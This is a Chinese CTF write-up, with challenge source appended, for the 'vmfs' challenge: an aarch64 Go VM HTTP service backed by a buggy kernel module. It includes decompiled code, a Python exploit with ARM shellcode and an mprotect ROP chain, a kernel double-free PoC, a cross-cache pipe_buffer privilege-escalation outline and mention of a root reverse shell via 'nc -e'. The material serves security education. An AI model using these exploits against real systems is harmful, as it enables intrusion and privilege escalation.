 v28 = *((_QWORD *)request + 9);
 v32 = runtime_convI2I(&type_io_Reader, *((_QWORD *)request + 8));
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v32;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v28);
 else
 v10[1] = v28;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v37);
 if ( v11 )
 {
 v24 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(Response_vtable, response, v24, v25, 400LL);
 }
 else if ( v37->Size > 0x8000 || (*(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0x180LL), v13 = v14[0], v14[1]) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v31 = (_QWORD *)v14[0];
 Id = v37->Id;
 Size = v37->Size;
 v27[1] = 0LL;
 v27[3] = 0LL;
 v27[4] = 0LL;
 v27[0] = Id;
 v27[2] = Size;
 v36 = v27;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v31;
 }
 v17 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v17 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v17, 0xFF00LL, v36);
 if ( v31 )
 {
 v26 = v18;
 os___file__close(*v31);
 v18 = v26;
 }
 if ( v18
 || (v38 = aSuccess,
 v39 = 7LL,
 v19 = runtime_convTstring(aSuccess),
 v20 = encoding_json_Marshal(&type_main_Message, v19),
 v23) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 Response_vtable->net_http_(_response)_Write(response, v20, v21, v22);
 }
 }
}

void __fastcall main_writeFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v33 <= *(_QWORD *)(v3 + 16) )
 runtime_morestack_noctxt();
 v32 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v37 = v4[0];
 v5 = runtime_newobject(&type_string_array_1_ptr);
 value = (__int64)v5;
 v5[1] = 16LL;
 *v5 = aApplicationJso;
 v6 = (__int64 *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v32, v37, v4[1]);
 v6[1] = 1LL;
 v6[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, value);
 else
 *v6 = value;
 v31 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v37 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v35 = (__int64)v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (__int64 *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v31, v37, v7[1]);
 v9[1] = 1LL;
 v9[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v35);
 else
 *v9 = v35;
 v39 = (main::
Req *)runtime_newobject(&type_main_Req);
 v30 = *((_QWORD *)request + 9);
 v34 = runtime_convI2I(&type_io_Reader, *((_QWORD *)request + 8));
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v34;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v30);
 else
 v10[1] = v30;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v39);
 if ( v11 )
 {
 v26 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(Response_vtable, response, v26, v27, 400LL);
 }
 else if ( v39->Size > 8 * v39->Data.len
 || (*(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0600LL), v13 = v14[0], v14[1]) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v33 = (_QWORD *)v14[0];
 v15 = v39->Id;
 v16 = v39->Data.data;
 v17 = v39->Size;
 v18 = v39->ChooseIndex;
 v29[4] = 0LL;
 v29[0] = v15;
 v29[1] = (__int64)v16;
 v29[2] = v17;
 v29[3] = v18;
 v38 = v29;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v33;
 }
 v19 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v19 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v19, 0xFF03LL, v38);
 if ( v33 )
 {
 v28 = v20;
 os___file__close(*v33);
 v20 = v28;
 }
 if ( v20
 || (v40 = aSuccess,
 v41 = 7LL,
 v21 = runtime_convTstring(aSuccess),
 v22 = encoding_json_Marshal(&type_main_Message, v21),
 v25) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 Response_vtable->net_http_(_response)_Write(response, v22, v23, v24);
 }
 }
}

void __fastcall main_runFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v52 < 0x18170 || (unsigned __int64)&v34[15] <= *(_QWORD *)(v3 + 16) )
 {
 v53 = Response_vtable;
 v54 = response;
 v55 = request;
 runtime_morestack_noctxt();
 }
 v55 = request;
 v53 = Response_vtable;
 v54 = response;
 v41 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v36 = v4[1];
 v46 = v4[0];
 v5 = runtime_newobject(&type_string_array_1_ptr);
 v45 = v5;
 v5[1] = 16LL;
 *v5 = aApplicationJso;
 v6 = (_QWORD *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v41, v46, v36);
 v6[1] = 1LL;
 v6[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, v45);
 else
 *v6 = v45;
 v40 = v53->net_http_(_response)_Header(v54);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v36 = v7[1];
 v46 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v44 = v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (_QWORD *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v40, v46, v36);
 v9[1] = 1LL;
 v9[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v44);
 else
 *v9 = v44;
 v48 = (main::
Req *)runtime_newobject(&type_main_Req);
 v39 = v55[9];
 v43 = runtime_convI2I(&type_io_Reader, v55[8]);
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v43;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v39);
 else
 v10[1] = v39;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v48);
 if ( v11 )
 {
 v32 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(v53, v54, v32, v33, 400LL);
 }
 else
 {
 *(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0600LL);
 v13 = v14[0];
 if ( v14[1] )
 goto LABEL_31;
 v42 = (_QWORD *)v14[0];
 v15 = regs_and_code;
 do
 {
 *v15 = 0LL;
 v15[1] = 0LL;
 v15 += 2;
 }
 while ( (__int64)v15 <= (__int64)&v51.len );
 v16 = memory;
 do
 {
 *v16 = 0LL;
 v16[1] = 0LL;
 v16 += 2;
 }
 while ( (__int64)v16 <= (__int64)&memory[4094] );
 v51.data = memory;
 v51.len = 4096LL;
 v51.cap = 4096LL;
 v17 = v48->Id;
 v18 = v48->Size;
 v19 = v48->ChooseIndex;
 v37[4] = 0LL;
 v37[0] = v17;
 v37[1] = ®s_and_code[17];
 v37[2] = v18;
 v37[3] = v19;
 v47 = v37;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v42;
 }
 v20 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v20 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v20, 0xFF04LL, v47);
 if ( v42 )
 {
 v35 = v21;
 os___file__close(*v42);
 v21 = v35;
 }
 if ( v21 )
 {
LABEL_31:
 net_http_Error(v53, v54, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v22 = v34;
 v23 = regs_and_code;
 do
 {
 v24 = *v23;
 v25 = v23[1];
 v23 += 2;
 *v22 = v24;
 v22[1] = v25;
 v22 += 2;
 }
 while ( (__int64)v23 <= (__int64)&v51.len );
 v26 = main_runVM();
 v49[0] = aSuccess;
 v49[1] = 7LL;
 v49[2] = v26;
 v27 = runtime_convT(&type_main_VmMessage, v49);
 v28 = encoding_json_Marshal(&type_main_VmMessage, v27);
 if ( v31 )
 net_http_Error(v53, v54, aInternalServer, 21LL, 500LL);
 else
 v53->net_http_(_response)_Write(v54, v28, v29, v30);
 }
 }
}

开了 sandbox ， dump 出来发现是禁用了 execve 和 execveat 。开了个 http server ，有三个接口，每个接口的输入格式都是main.Req的 json 形式。提取出来逻辑如下：

api post interface: {"Id": uint64, "Size": uint64, "ChooseIndex": uint64, "Data": uint64[]}
// {"Id": 0, "Size": 1, "ChooseIndex": 0, "Data": [1, 2]}

url: ?:
8080/api/create-file
 assert(Size <= 0x8000);
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF00, &(struct_to_kernel) {Id, 0, Size, 0, 0});
 os.(_file).close(*gofile_obj);

url: ?:
8080/api/write-file:
 assert(Size <= 8 * Data.length);
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF03, &(struct_to_kernel) {Id, Data.ptr, Size, ChooseIndex, 0});
 os.(_file).close(*gofile_obj);

url: ?:
8080/api/run-file:
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF04, &(struct_to_kernel) {Id, output_data, Size, ChooseIndex, 0});
 os.(_file).close(*gofile_obj);
 retval = main.runVM(output_data); // uint64[]
 Write({"Text": "success", "Return": retval});

ioctl 调用说明这里要跟内核交互了。逆内核模块 vmfs ，得到几项功能：

struct struct_to_kernel {
 uint64 Id;
 uint64* Data;
 uint64 Size;
 uint64 ChooseIndex;
 uint64 method;
};

ff00: create(Id, Size)
ff01: mov_to_trash(Id, ChooseIndex)
ff02: delete_from_trash(Id, ChooseIndex)
ff03: set_data(Id, Size, ChooseIndex, Data)
ff04: get_data(Id, Size, ChooseIndex, Data)
ff05: sort(method) // 3: select sort

create 会对 Size 做检测，不能大于 0x10000。

mov_to_trash 会将 list 中已有的项添加到 trash 中，并释放分配的数组内存，但是没有置为空。

delete_from_trash 将 trash 中的一项彻底删除，并将 list 中对应项释放掉并且置为空。

set_data 和 get_data 就是向分配的数组中写入数据和拿出数据。

sort 会对 list 中的项目排序，不同 method 值采用不同的排序算法。其中当 method = 3 时采用选择排序，而选择排序不是稳定的排序算法，即不能保证排序之前值相同的项在排序后保持相同的顺序，再结合 mov_to_trash 就可以 double free 。不过这是内核的利用部分了，用户态程序是没有 ff01 的接口的，需要先找用户态程序的漏洞。

在内核模块初始化时会自动添加一条 list 中的记录：

v4 = (object *)kmalloc_trace(MEMORY[0x33E0], 0xCC0LL, 0x18LL);
 v5 = v4;
 if ( v4 )
 {
 v4->addr = 0LL;
 v4->Id = 0x636DB8C2LL;
 v4->Size = 0x10000LL;
 v6 = (uint64 *)kmalloc_large(0x10000LL, 0xCC0LL);
 v5->addr = v6;
 if ( v6 )
 {
 memset(v6, 0, 0x10000uLL);
 list[0] = v5;
 }
 }

Size 为 0x10000 ，而用户态程序可创建的最大大小为 0x8000 ，如果只是看用户态程序是没问题的，而添加的这一条记录就给用户态程序带来了漏洞，因为 run-file 会将数据从内核复制到用户态程序中，用户态程序并没有检查 Size 的大小，用来保存数据的栈内存只有 0x8000 字节（即 4096 个 uint64 ），如果从内核里复制出来的长度大于 0x8000 字节就可以覆盖栈上数据，先覆盖的是 vm 执行时的 memory 结构体，覆盖指针、长度就可以任意读写；再之后是上层函数的 lr 指针，再后面是当前函数的参数，因为函数返回之前要调用第一个参数的一个虚表函数，所以需要设置为一个程序里的值。再后面就是随便栈溢出构造 rop 了。arm 的 rop 不太好做，不过幸好能找到这样一条 gadget ,大概是类似于x86的 setcontext 的用法：

.text:
000000000007347C LDP X25, X26, [SP,#0xC8]
.text:
0000000000073480 LDP X23, X24, [SP,#0xB8]
.text:
0000000000073484 LDP X21, X22, [SP,#0xA8]
.text:
0000000000073488 LDP X19, X20, [SP,#0x98]
.text:
000000000007348C LDP X16, X17, [SP,#0x88]
.text:
0000000000073490 LDP X14, X15, [SP,#0x78]
.text:
0000000000073494 LDP X12, X13, [SP,#0x68]
.text:
0000000000073498 LDP X10, X11, [SP,#0x58]
.text:
000000000007349C LDP X8, X9, [SP,#0x48]
.text:
00000000000734A0 LDP X6, X7, [SP,#0x38]
.text:
00000000000734A4 LDP X4, X5, [SP,#0x28]
.text:
00000000000734A8 LDP X2, X3, [SP,#0x18]
.text:
00000000000734AC LDP X0, X1, [SP,#8]
.text:
00000000000734B0 LDR X30, [SP,#0x1F0]
.text:
00000000000734B4 LDUR X29, [SP,#-8]
.text:
00000000000734B8 LDR X27, [SP]
.text:
00000000000734BC ADD SP

再结合 go 程序里自带的 syscall 函数，加上前面的任意地址读写，加上程序没开 pie ，可以直接在 bss 段写入 shellcode 之后调用 mprotect 改 bss 段权限，再跳转到 shellcode 执行，在 shellcode 中调用 accept 得到与用户交互的 fd ，这样就可以读取更多的 shellcode 用于执行，这样就可以进入到内核利用了。

接下来就是这题比较恶心的点了。调试时首先循环 read 4 号 fd ，发现不阻塞且无法得到大于 0 的结果。最后关掉 4 ，然后用对 socket fd 3 调用 sys_accept ，调了半天还是 accept 不进来，最后发现原来是 accept 不阻塞。最后循环 accept 和 recvfrom ，才开始稳定读取 shellcode 并利用。

由于禁用掉了 execve 和 execveat ，于是只能把用来打内核的 exp 的 binary 给读出来，作为 shellcode 来执行。mmap 出代码段，即 exp 中的 0x23300000 和 stack 段，全部内存 dump 进去还原现场，设置完 sp 和 pc ，最后从 start 开始执行。

周二事情比较多，加上俺也确实不太会逆向，所以专业的事情让专业的逆向爷爷来做。所以当我真正上手这个题的时候逻辑好像跟我无关了。

在我的视角中，只知道有内核菜单堆的几个功能，其中 0xff01 的 free 之后还留着 Dangling Pointer。并且，这个 Dangling Pointer 还会在选择排序之后被换位… 然后就是… Double Free~

补充一点：选择排序是一种不稳定的排序算法。在这个题中，选择排序会导致相同 id 不同 idx 的两个 object 位置发生交换。当其中一个已经是 Dangling Pointer 的时候，进行选择排序，再尝试 free 另一个 object。因为发生了交换，所以第二次 free 的还是原来的那个 object。这就构成了 Double Free。

POC 如下：

PRINT_AND_EXECUTE(dev_alloc(2, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(2, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(1, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(1, 0xc0););
 PRINT_AND_EXECUTE(dev_free(2, 1););
 PRINT_AND_EXECUTE(dev_select_sort(););
 PRINT_AND_EXECUTE(dev_free(2, 0););

于是接下来就进入到常规 Linux kernel exploitation 的环节。Double Free 在内核堆利用中算是比较好利用的一种，而且这个题还可以控制 double free object 的大小，所以思路应该有很多。比如用直接用 tty_struct 泄露+ROP。

不过俺之前被 aarch64 的 ROP 整怕了，而且也不知道新内核里面 gadget 够不够用，思来想去还是别赌了，还是打稳定一点的 cross-cache 吧…

思路呢就和去年 N1CTF 的 Praymoon 差不多。指路牌 ->N1CTF 2022 Praymoon Write Up | V1me’s Blog (imv1.me)（https://blog.imv1.me/2022/11/10/N1CTF-2022-Praymoon-Write-Up/）

这里简单概括一下：

1.通过 sock 构造 order 0 的页风水。可以参考Will’s Root: Reviving Exploits Against Cred Structs – Six Byte Cross Cache Overflow to Leakless Data-Oriented Kernel Pwnage (willsroot.io)。当然，嫌麻烦 pipe_buffer 也能构造出来，但是后面的利用会用到 pipe_buffer，所以不想搞混了。

2.释放掉 sock 获取的奇数页面，分配 pipe_buffer 以占据。

3.释放掉 sock 获取的偶数页面，先用 vm_area_struct 占用一点，再用题目的漏洞结构体占用一点。所以页面布局大概就是下面这样。

4.第一次 free vuln_object，用 user_key_payload 再占回来；第二次 free vuln_object，再用 vuln_object 占用回来（题目的 vuln_object 还挺好用，居然可以往里面写东西，感动）。这样就可以修改 user_key_payload 的 datalen 字段以实现溢出读。又因为 vm_area_struct 里面有 list_head 结构，所以很容易泄露出堆地址。同样的也泄露出了 pipe_buffer 们的地址。

5.将 double_free 从 vuln_object 转移到 pipe_buffer。这里用的是poll_list(感谢 CorCTF 两位大爹)。结合我们已经泄露出的堆地址，我们用 poll_list 占据步骤 4 中用完释放的 user_key_payload。此时步骤 4 中分配的 vuln_object 和 poll_list 占用同一块空间，所以利用 edit 功能把 poll_list->next 改到 pipe_buffer 上，就可以构造 pipe_buffer 的 UAF 了。

6.利用和 pipe_buffer 同在 kmalloc-cg 的 msg_msg 结构体（两年不见，你还好吗）就可以修改 pipe_buffer 的 flag 了。

7.最后就是喜闻乐见的pipe_primitive提权了。修改 busybox 的 halt_main 函数，就可以在 init.sh 执行到 poweroff 的时候以 root 身份执行 shellcode。

一切都看起来很简单，俺也在 6 个小时的时间内调通了内核 exp。此时正是凌晨 4 点，用户态那边也基本弄完了，一切都在向好的方向发展…

所以，为什么俺们又从早上搞到了晚上 9 点呢？

前情提要，用户态 vm 开了 seccomp，ban 掉了 execve 和 execveat。如果只是一个用户态题目，rop 执行 orw 也就结束了，但是… 我们还有一个内核 exp 的二进制需要上传执行。没有 shell，怎么传？传不了一点。

和用户态爷爷（还是 IChild）商量了一下，可以在用户态执行 shellcode 之后，就可以给我 mmap 一段 rwx 内存，我就可以手动把二进制文件”加载”到内存中，然后执行。(WHO NEEDS EXECVE? UH?)

然后，问题就来了。SegmentFault… SegmentFault… SegmentFault….

单步跟了一下，发现问题出现在栈上。libc_start_main 会从栈上拿 env。所以，我们这次把一个合法的栈也拷贝进内存了。

然后。。。继续 SegmentFault。。。WTF？？？

而且这次死的地方十分玄学，死在内核 exp 刚刚进去的 mmap syscall 中，也就是程序进了 mmap syscall 中再也没出来。。。

于是果断地拉来了巨神，在巨神的指导下把 aarch64 的 strace 编译好放到了 rootfs 里面，运行…

“这个 SIGURG 是你预期的吗？”

“【黑人问号】哪来的 SIGURG?”

“但它就是被 SIGURG 杀了…”

于是在 shellcode 里面 handle 了一下 SIGURG（此处省略 4 个小时。。。）

…

终于在马拉松式的调试一天之后，成功改完了 busybox，复用 8080 端口 nc -e 拿到了反弹的 root shell！

今日中午12：00

第十题《精准攻击》已开赛！

在这个充满变数的赛场上，没有人能够预料到最终的结局。有时，优势的领先可能只是一时的，一瞬间的失误就足以颠覆一切。而那些一直默默努力、不断突破自我的人，往往会在最后关头迎头赶上，成为最耀眼的存在。

谁能保持领先优势？谁能迎头赶上？谁又能突出重围成为黑马？

球分享

球点赞

球在看

点击阅读原文进入比赛


```
# vmfs

## 功能

vm 中开启了一个 http 服务，该服务可以运行用户上传的代码，代码文件保存在 /dev/vmfs 驱动中，单独运行 vm 程序是无法执行代码的，因为程序无法找到驱动。

用户可以上传自己的代码，之后发送运行指令，使得代码在 vm 程序中执行，并返回执行得到的结果。

**用户态功能**：
**内核态功能**：

```c
    #define VMFS_CREATE_FILE 0xff00 // 创建文件节点
    #define VMFS_MOVE_TO_TRASH 0xff01 // 将文件节点移动到回收站
    #define VMFS_DELETE_FROM_TRASH 0xff02 // 彻底删除文件节点
    #define VMFS_WRITE_FILE 0xff03 // 写文件节点
    #define VMFS_READ_FILE 0xff04 // 读文件节点
    #define VMFS_SORT_FILE 0xff05 // 对文件节点进行排序
00000000 main_machine_0 struc ; (sizeof=0x80A0, align=0x8, copyof_2879)
00000000 ; XREF: main.runVM/r
00000000 ; main.runFile/r
00000000 reg DCQ 16 dup(?)
00000080 _pc DCQ ? ; XREF: main.runVM:
loc_1F96C8/r
00000080 ; main.runVM+88/r ...
00000088 code DCQ 4096 dup(?) ; XREF: main.runVM+24/o
00008088 data _slice_uint64 ?
000080A0 main_machine_0 ends

00000000 _slice_uint64 struc ; (sizeof=0x18, align=0x8, copyof_224)
00000000 ; XREF: .data:
crypto_sha512._K/r
00000000 ; main_machine_0/r ...
00000000 array DCQ ? ; XREF: crypto_sha512.blockGeneric+27C/r
00000000 ; crypto_sha512.blockAsm+10/r ; offset
00000008 len DCQ ? ; XREF: runtime._ptr_profBuf.write+38/w
00000008 ; runtime._ptr_profBuf.write+88/r ...
00000010 cap DCQ ? ; XREF: runtime._ptr_profBuf.write+4AC/w
00000010 ; runtime._ptr_profBuf.write+4D8/r ...
00000018 _slice_uint64 ends
func runFile(w http.ResponseWriter, r *http.Request) {
 w.Header().Set("Content-Type", "application/json")
 w.Header().Set("Access-Control-Allow-Origin", "*")

 var req Req
 err := json.NewDecoder(r.Body).Decode(&req)
 if err != nil {
 http.Error(w, err.Error(), http.StatusBadRequest)
 return
 }

 f, err := os.OpenFile(dev_path, syscall.O_RDONLY, 0600)
 if err != nil {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 var vm machine
 vm.data = make([]uint64, 0x1000)

 data := user_argv{
 id: uint64(req.Id),
 addr: uintptr(unsafe.Pointer(&(vm.code))),
 size: uint64(req.Size),
 choose_index: uint64(req.ChooseIndex),
 sort_option: uint64(0),
 }
 _, _, errno := syscall.Syscall(
 syscall.SYS_IOCTL,
 uintptr(f.Fd()),
 uintptr(VMFS_READ_FILE),
 uintptr(unsafe.Pointer(&data)),
 )

 f.Close()

 if errno != 0 {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 message := VmMessage{
 Text: "success",
 Return: runVM(vm),
 }

 response, err := json.Marshal(message)
 if err != nil {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }

 w.Write(response)
}
func createFile(w http.ResponseWriter, r *http.Request) {
 w.Header().Set("Content-Type", "application/json")
 w.Header().Set("Access-Control-Allow-Origin", "*")

 var req Req
 err := json.NewDecoder(r.Body).Decode(&req)
 if err != nil {
 http.Error(w, err.Error(), http.StatusBadRequest)
 return
 }
 if req.Size > 0x1000 * 8 {
 http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 return
 }
 ...
}
static int struct_initial(void)
{
 int i;
 struct node *tmp = NULL;

 for (i = 0; i < LENGTH; i++)
 {
 list[i] = NULL;
 trash[i].id = NONE;
 trash[i].freed = NULL;
 }

 tmp = (struct node *)kmalloc(sizeof(struct node), GFP_KERNEL);
 if(!tmp)
 {
 return NONE;
 }
 memset(tmp, 0, sizeof(struct node));
 tmp->id = 0x636db8c2;
 tmp->msg_len = 0x10000;
 tmp->msg = (char *)kmalloc(0x10000, GFP_KERNEL);
 if(!(tmp->msg))
 {
 return NONE;
 }

 memset(tmp->msg, 0, 0x10000);

 list[0] = tmp;

 return 0;
}
func runVM(vm machine)(r uint64){
 r = 0xdeadbeef
 end:
 for vm.pc < 0x1000 {
 switch vm.code[vm.pc] {
 case 0:
 break end
 case 1:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] += vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 2:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] -= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 3:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] *= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 4:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16{
 return
 }
 vm.reg[vm.code[vm.pc + 1]] /= vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 5:
 if vm.code[vm.pc + 1] >= 16 {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.code[vm.pc + 2]
 vm.pc += 3
 case 6:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= uint64(len(vm.data)) {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.data[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 7:
 if vm.code[vm.pc + 1] >= uint64(len(vm.data)) || vm.code[vm.pc + 2] >= 16 {
 return
 }
 vm.data[vm.code[vm.pc + 1]] = vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 case 8:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16 || vm.reg[vm.code[vm.pc + 2]] >= uint64(len(vm.data)) {
 return
 }
 vm.reg[vm.code[vm.pc + 1]] = vm.data[vm.reg[vm.code[vm.pc + 2]]]
 vm.pc += 3
 case 9:
 if vm.code[vm.pc + 1] >= 16 || vm.code[vm.pc + 2] >= 16 || vm.reg[vm.code[vm.pc + 1]] >= uint64(len(vm.data)) {
 return
 }
 vm.data[vm.reg[vm.code[vm.pc + 1]]] = vm.reg[vm.code[vm.pc + 2]]
 vm.pc += 3
 default:
 return
 }
 }
 r = vm.reg[0]
 return
}
line CODE JT JF K
=================================
 0000: 0x20 0x00 0x00 0x00000004 A = arch
 0001: 0x15 0x00 0x04 0xc00000b7 if (A != ARCH_AARCH64) goto 0006
 0002: 0x20 0x00 0x00 0x00000000 A = sys_number
 0003: 0x15 0x02 0x00 0x00000142 if (A == execveat) goto 0006
 0004: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW
 0006: 0x06 0x00 0x00 0x00000000 return KILL
# user

def req(api, data):
 json_str = json.dumps(data)
 sh.send((
f'''POST {api} HTTP/1.1
Host: {host}:{port}
Accept: */*
Connection: keep-alive
Content-Length: {len(json_str)}
Content-Type: application/json

'''.replace('n', 'rn') + json_str).encode())

vm_code = []
def write(address, value):
 global vm_code
 vm_code += [5, 0, value]
 vm_code += [7, address//8, 0]
write(0x498f10, 0x68732f6e69622f)
write(0x498f00, 0x498f10)

shellcode = asm(
'''

mov x8, 220
mov x0, 19
mov x1, 0
svc 0 ;// fork

cmp x0, 0

bne over

;// child

mov x8, 24
mov x0, 4
mov x1, 0
mov x2, 0
svc 0 ;// dup3(4, 0, 0)

mov x8, 24
mov x0, 1
mov x1, 4
mov x2, 0
svc 0 ;// dup3(1, 4, 0)

mov x8, 24
mov x0, 0
mov x1, 1
mov x2, 0
svc 0 ;// dup3(0, 1, 0)

mov x8, 24
mov x0, 0
mov x1, 2
mov x2, 0
svc 0 ;// dup3(0, 2, 0)

mov x8, 25
mov x0, 0
mov x1, 4
mov x2, 0
svc 0 ;// fcntl(0, F_SETFL, 0)

str x0, [sp, 0]
mov x0, 0
mov x1, sp
mov x2, 8
mov x8, 64
svc 0

mov x8, 63
mov x0, 0
adr x1, 12
mov x2, 0x800
svc 0 ;// read(0, shellcode, 0x800)

shellcode:

over:
mov x8, 172
svc 0 ;// getpid

mov x8, 129
mov x1, 19
svc 0 ;// kill(self, SIGSTOP)

''')

shellcode_i = 0
while(shellcode):
 tmp = shellcode[:8].ljust(8, b' ')
 shellcode = shellcode[8:]
 write(0x498000 + shellcode_i, u64(tmp))
 shellcode_i += 8

stack_list = [0x400011b000, 0x400012b000, 0x4000187000]
for stack_addr in stack_list:
 write(stack_addr+0x820, 0x12808)

 write(stack_addr+0x840, 0x498000)

 write(stack_addr+0x860, 7)
 write(stack_addr+0x858, 0x1000)
 write(stack_addr+0x850, 0x498000)
 write(stack_addr+0x848, 226)

payload = {"Id":
0x636db8c2, "ChooseIndex":0, "Size": 0x8018, "Data":
vm_code + [0] * (0x1000 - len(vm_code)) + [0, 0x7fffffffffffffff, 0x7fffffffffffffff]}
req('/api/write-file', payload)
payload = {"Id":
0x636db8c2, "ChooseIndex":0, "Size": 0x8018}
req('/api/run-file', payload)

sh.recvuntil(b' ' * 8)
static ssize_t vmfs_ioctl(struct file *file, unsigned int cmd, size_t arg)
{
 struct user_argv argv;
 size_t result = 0;

 mutex_lock(&vmfs_lock);

 if(result == 0 && copy_from_user(&argv, (void *)arg, sizeof(argv)))
 {
 result = -1;
 }

 if(result == 0 && argv.id == NONE)
 {
 result = -1;
 }

 if(result == 0)
 {
 switch (cmd)
 {
 case VMFS_CREATE_FILE:
 if(result == 0 && add(argv.size, argv.id))
 {
 result = -1;
 }
 break;
 case VMFS_MOVE_TO_TRASH:
 if(result == 0 && move_to_trash(argv.id, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_DELETE_FROM_TRASH:
 if(result == 0 && delete_from_trash(argv.id, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_WRITE_FILE:
 if(result == 0 && write_file(argv.id, argv.addr, argv.size, argv.choose_index))
 {
 result = -1;
 }
 break;
 case VMFS_READ_FILE:
 if(result == 0 && read_file(argv.id, argv.addr, argv.size, argv.choose_index))
 {
 result = -1;
 }
 break;
